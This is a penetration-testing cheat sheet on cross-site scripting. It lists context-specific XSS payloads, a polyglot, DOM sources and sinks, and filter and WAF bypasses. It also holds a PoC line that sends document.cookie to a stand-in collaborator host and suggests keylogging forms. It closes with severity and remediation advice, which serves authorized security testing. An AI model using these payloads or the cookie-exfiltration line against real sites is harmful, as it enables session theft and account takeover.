# Cross-Site Scripting (Reflected / Stored / DOM / mutation)

Ubiquitous; value comes from chaining to account takeover (cookie/token theft,
CSRF-token exfil, admin action forgery). Always demonstrate real impact, not
just `alert(1)`, and use benign PoCs.

## Detection sweep
Inject a unique marker in every input, then find where it reflects and in what
context (HTML body, attribute, JS string, URL, CSS). Marker: `zqx1'"><svg`.

## Context-aware payloads
```
HTML body:      <svg onload=confirm(1)>   <img src=x onerror=confirm(1)>
Attribute:      "><svg onload=confirm(1)>   ' autofocus onfocus=confirm(1) x='
JS string:      ';confirm(1)//    </script><svg onload=confirm(1)>
Inside href:    javascript:confirm(1)
Template/AngularJS: {{constructor.constructor('alert(1)')()}}
Polyglot (portswigger):
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## DOM XSS
Trace sources → sinks in JS:
- Sources: `location`, `location.hash/search`, `document.referrer`, `postMessage`,
  `localStorage`, `window.name`.
- Sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`,
  `Function`, `location=`, jQuery `$()`/`.html()`, framework `dangerouslySetInnerHTML`.
- Test `#` fragment payloads (never sent to server): `https://t/#<img src=x onerror=alert(1)>`.
- `postMessage` handlers without origin check → inject via `iframe.contentWindow.postMessage`.

## Stored XSS hotspots
Profile fields, comments/reviews, filenames, support tickets, `User-Agent`/`Referer`
logged into admin panel (blind XSS — use xsshunter/interactsh callback), SVG
uploads, markdown renderers, CSV/HTML export.

## Filter/WAF bypass
- Case + no-space: `<sVg/onload=confirm(1)>`, `<img/src/onerror=confirm(1)>`.
- Alternate handlers: `onpointerdown`, `onanimationstart` + CSS, `onwheel`.
- Encoding: HTML entities in attributes, `\u`/`\x` in JS, `&#x6a;avascript:`.
- Broken-tag mutation (mXSS): `<listing>`, `<noscript>`, `<template>`,
  `<math>`/`<svg>` foreign-content confusion, DOMPurify bypass via mutations.
- No parentheses: `onerror=alert\`1\``, `<script>onerror=alert;throw 1</script>`.

## Impact PoCs (authorized, benign)
```js
// exfil non-httpOnly cookie / token to your Collaborator:
new Image().src='https://COLLAB/?c='+encodeURIComponent(document.cookie)
// prove CSRF-token theft or admin action — describe, don't weaponize broadly.
```
If cookies are `HttpOnly`, pivot to reading CSRF tokens, calling authenticated
APIs from the victim's origin, or keylogging a form — enough to show ATO risk.

## Real disclosed-report patterns
- Stored XSS in display name executing in admin support console (blind XSS).
- DOM XSS via `location.hash` into `innerHTML` on SPA route.
- SVG avatar with inline script executing on profile view.
- markdown `[x](javascript:...)` link surviving sanitizer.

## Severity
Stored XSS hitting other users / admins → High–Critical (ATO). Reflected needing
user interaction → Medium–High. Self-XSS only → Informational (unless chained).

## Remediation to recommend
Context-aware output encoding; framework auto-escaping (don't bypass with
`dangerouslySetInnerHTML`/`v-html`); strict CSP (`nonce`-based, no
`unsafe-inline`); sanitize rich text with a maintained library server-side;
`HttpOnly` + `Secure` + `SameSite` cookies; validate `postMessage` origins.
